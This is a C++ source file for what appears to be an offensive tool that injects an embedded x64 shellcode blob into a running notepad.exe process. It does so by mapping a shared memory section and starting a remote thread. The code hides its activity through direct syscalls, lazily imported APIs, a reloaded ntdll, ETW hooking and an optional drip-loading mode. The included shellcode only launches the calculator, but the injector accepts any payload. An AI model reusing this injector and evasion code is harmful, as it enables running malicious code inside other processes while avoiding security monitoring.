#include "Mapper.hpp"
#include "LazyImporter.hpp"
#include "DumpVEHs.hpp"
#include "HookETW.hpp"
#include "DripLoader.h"

namespace sw3 {
	extern "C" {
#include "syscalls_all.h"

}
}



typedef enum SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

using pNtCreateSection = NTSTATUS(NTAPI*)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL);

using pNtMapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);

using pRtlCreateUserThread = NTSTATUS(WINAPI*) (HANDLE hProcess,
	SECURITY_DESCRIPTOR* pSec,
	BOOLEAN fCreateSuspended,
	SIZE_T StackZeroBits,
	SIZE_T* StackReserved,
	SIZE_T* StackCommit,
	void*,
	void*,
	HANDLE* pThreadHandle,
	CLIENT_ID* pResult);

  typedef NTSTATUS (__kernel_entry* pNtAllocateVirtualMemory)(
	 HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);

  typedef  NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
		   HANDLE               ProcessHandle,
		   PVOID                BaseAddress,
		   PVOID                Buffer,
		   ULONG                NumberOfBytesToWrite,
		   PULONG              NumberOfBytesWritten );

  typedef HANDLE(*pCreateToolhelp32Snapshot)(
	   DWORD dwFlags,
	  DWORD th32ProcessID
  );

  typedef void* (*pmemcpy)(
	  void* dest,
	  const void* src,
	  size_t count
  );
unsigned char calc[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };

SIZE_T calc_len = sizeof(calc);



int Mapper::FindTarget(WCHAR* procname) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = LI_FN(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}
	printf("target name : %c\n", pe32.szExeFile);
	while (Process32Next(hProcSnap, &pe32)) {
		if (_wcsicmp(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}
	if (hProcSnap!=NULL) CloseHandle(hProcSnap);
	return pid;
}

Mapper::Mapper() {

}

int Mapper::InjectView( unsigned char* payload, SIZE_T payloadLen,int pid) {
	HANDLE hProc;
	hProc = LI_FN(OpenProcess)(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);


	DWORD status_code;
	HANDLE hSection = NULL, hThread = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	CLIENT_ID cid;
	NTSTATUS x;
	std::shared_ptr<Util> u =std::make_shared<Util>() ;
	std::shared_ptr<ETWC3> e =std::make_shared<ETWC3>(u) ;
	std::shared_ptr<VEHDumper> v =std::make_shared<VEHDumper>(u) ;

	v->ReloadNtDll();

	PVOID module = u->FindBase(L"ntdll.dll");

	//pNtCreateSection ntCrtSec = (pNtCreateSection)LI_FN(GetProcAddress)((HMODULE)module, "NtCreateSection");
	//pNtMapViewOfSection ntMapVw = (pNtMapViewOfSection)LI_FN(GetProcAddress)((HMODULE)module, "NtMapViewOfSection");
	//pRtlCreateUserThread rtlCrtUsrThrd = (pRtlCreateUserThread)LI_FN(GetProcAddress)((HMODULE)module, "RtlCreateUserThread");
	//ntCrtSec(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payloadLen, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	//ntMapVw(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &payloadLen, ViewUnmap, NULL, PAGE_READWRITE);
	//memcpy(pLocalView, payload, payloadLen);// The whole point of WriteProcessMemory() is to write to another process' virtual memory. You don't need it to edit your own process virtual memory. copy payload into local view 
	//ntMapVw(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T*)&payloadLen, ViewUnmap, NULL, PAGE_EXECUTE_READ); //create remote view in an outer process
	//rtlCrtUsrThrd(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);

	x = sw3::Sw3NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payloadLen, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (NT_SUCCESS(x))std::cout << "\n[+] NtCreateSection success" ;
	else std::cout << "\n[-] NtCreateSection fail";

	x = sw3::Sw3NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &payloadLen, sw3::ViewUnmap, NULL, PAGE_READWRITE);
	if (NT_SUCCESS(x))std::cout << "\n[+] NtMapViewOfSection success";
	else std::cout << "\n[-] NtMapViewOfSection fail";

	memcpy(pLocalView, payload, payloadLen);// The whole point of WriteProcessMemory() is to write to another process' virtual memory. You don't need it to edit your own process virtual memory. copy payload into local view 
	x = sw3::Sw3NtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T*)&payloadLen, sw3::ViewUnmap, NULL, PAGE_EXECUTE_READ); //create remote view in an outer process
	if (NT_SUCCESS(x))std::cout << "\n[+] NtMapViewOfSection success";
	else std::cout << "\n[-] NtMapViewOfSection fail";
	
	x = sw3::Sw3NtCreateThreadEx(&hThread,THREAD_ALL_ACCESS, NULL, hProc, pRemoteView, 0, 0, 0, 0,0, NULL);
	if (NT_SUCCESS(x)) {
		std::cout << "\n[+] NtCreateThreadEx success";
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return -1;
	} else std::cout << "\n[-] NtCreateThreadEx fail: "<<GetLastError();
	CloseHandle(hProc);

	return 0;
}

int Mapper::Inject(int mode) {
	int pid = 0;
	HANDLE hProc = NULL;
	bool injected = false;
	while (!injected) {
		WCHAR target[] = L"notepad.exe";
		pid = FindTarget(target);
		if (pid) {
			printf("\n[+] Notepad.exe PID = %d\n", pid);
			switch (mode) {
				case 1:
					InjectView( calc, calc_len,pid);
					injected = true;
					break;
				case 2:
					Drip(pid, 2);
					injected = true;
					break;
			}
		}
		else { printf("\n[+] Target not found");
		injected = true;
		}
	}
	return 0;
}

Mapper *map = new Mapper;


